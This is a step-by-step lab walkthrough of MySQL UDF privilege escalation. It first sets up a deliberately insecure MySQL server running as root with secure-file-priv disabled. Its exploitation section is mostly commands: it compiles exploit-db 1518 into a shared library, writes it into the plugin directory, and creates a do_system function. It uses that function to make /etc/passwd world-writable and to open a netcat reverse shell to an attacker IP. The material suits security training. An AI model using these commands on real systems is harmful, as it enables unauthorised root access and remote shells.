# Escalate_via_SQL_on_root_(UDF)

# Setting-up lab:

## Download and Install Required Packages

```
wget <https://downloads.mysql.com/archives/get/p/23/file/mysql-common_5.6.51-1debian9_amd64.deb>
wget <https://downloads.mysql.com/archives/get/p/23/file/mysql-community-client_5.6.51-1debian9_amd64.deb>
wget <https://downloads.mysql.com/archives/get/p/23/file/mysql-client_5.6.51-1debian9_amd64.deb>
wget <https://downloads.mysql.com/archives/get/p/23/file/mysql-community-server_5.6.51-1debian9_amd64.deb>
wget <https://downloads.mysql.com/archives/get/p/23/file/mysql-server_5.6.51-1debian9_amd64.deb>

```

## Missing dependencies if any

Add the Debian repo 

```
sudo vim /etc/apt/sources.list
```

Add the following line at the end:

```
 deb <http://archive.debian.org/debian> stretch main
```

Update and Install Dependencies

```
sudo apt update
sudo apt install -y libaio1 libncurses5 libtinfo5
```

## Install the Packages in Order

```
sudo dpkg -i mysql-common_5.6.51-1debian9_amd64.deb
sudo dpkg -i mysql-community-client_5.6.51-1debian9_amd64.deb
sudo dpkg -i mysql-client_5.6.51-1debian9_amd64.deb
sudo dpkg -i mysql-community-server_5.6.51-1debian9_amd64.deb
sudo dpkg -i mysql-server_5.6.51-1debian9_amd64.deb
```

Start and set to start on boot

```
sudo systemctl start mysql
sudo systemctl enable mysql
```

Verify MySQL version:

```
mysql --version
```

## Change user to root:

```
sudo vim /lib/systemd/system/mysql.service
```

Find:

```
User=mysql
Group=mysql
```

Change to:

```
User=root
Group=root
```

Restart:

```

 sudo systemctl daemon-reload
 sudo systemctl restart mysql
```

Now MySQL will run as root. 🚀

## Run service for local host:

```
sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf
```

Find the bind-address and change it to local host:

```
bind-address = 127.0.0.1
```

Create a mysql user:

```
mysql -u root -p
```

Inside MYSQL, run

```

CREATE USER 'hacker'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'localhost' WITH GRANT OPTION;
FLUSH PRIVILEGES;

```

## Disable secure-file-priv:

secure-file-priv ensure that mysql can only read and write files to specific directory.

Edit file /etc/mysql/mysql.conf.d/mysqld.cnf:

```
sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf
```

Give secure-file-priv an empty value

```
secure-file-priv=
```

Restart MYSQL:

```
sudo systemctl restart mysql
```

# Enumeration:

Service enum for network based service using netstat

```
netstat -nltup
```

Output:

```
               
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 **127.0.0.1:3306**          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp6       0      0 fe80::a00:27ff:fe0a:546 :::*                                -              
```

#MYSQL is running on local host 

List running process using ps and grep “mysql”

```
ps -aux | grep "mysql"
```

Output:

```
**root**         708  0.0  0.0   2596  1664 ?        Ss   02:22   0:00 /bin/sh /usr/bin/mysqld_safe
**root**         885  0.0 22.8 1286264 462124 ?      Sl   02:22   0:01 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock
```
#MYSQL is running through root user.

# Exploiatation:

The exploit that has been used 

  [https://www.exploit-db.com/exploits/1518](https://www.exploit-db.com/exploits/1518)

Compile the code.

```
gcc -g -c 1518.c
```

Create a shared library

```
gcc -g -shared -Wl,-soname,1518_udf2.so -o [1518_udf.so](http://1518.so/) 1518.o -lc
```

Find any writable directory and move the 1518_udf.so in to that directory.

```
mv ./1518_udf.so /tmp
```

Login mysql :

```
mysql -u hacker -p password
```

Check version:

```
select @@version;
```

Check architecture:

```
select @@version_compile_os, @@version_compile_machine;
show variables like '%compile%';
```

Check secure_file_priv value

```
show variables like '%secure_file_priv%';
```

If it is empty you can read and write data/file in any directory.

Switch to mysql database

```
use mysql;
```

Create a table.

```
create table foo(line blob);
```

Use load-file function to insert the content into the table.

```
insert into foo values(load_file('/tmp/1518_udf.so'));
```

Check plugin directory location:

```
 select @@plugin_dir;
```

Dump that inserted shared library content in the plugin directory location.

```
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518_udf.so';
```

 Create function:

```
create function do_system returns integer soname '1518_udf.so';
```

Use function for exploitation,verify using ping command or by creating file:

```
 select do_system('ping -c 4 192.168.0.225');  
 select do_system('touch /tmp/test'); 
```

Change the permission of /etc/passwd to 777 for root access

```
 select do_system('chmod 777 /etc/passwd');
```

Use netcat to take shell

```
select do_system('nc -e /bin/bash $attacker_IP $port');

Example:
select do_system('nc -e /bin/bash 192.168.31.6 223');
```

References:

[https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf](https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf)

[https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss](https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss)
